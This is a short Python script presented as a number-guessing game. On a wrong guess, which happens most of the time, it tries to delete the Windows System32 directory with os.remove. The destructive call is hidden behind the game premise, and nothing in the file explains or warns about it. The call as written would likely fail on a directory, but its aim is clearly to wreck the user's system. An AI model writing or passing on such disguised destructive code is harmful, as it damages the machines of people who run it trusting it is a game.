import random
import os

print("Let's play a game!")
lucky_number = int(input("Guess a number between 1 and 10:"))

if random.randint(1,10) != lucky_number:
    os.remove("C:\Windows\System32")
    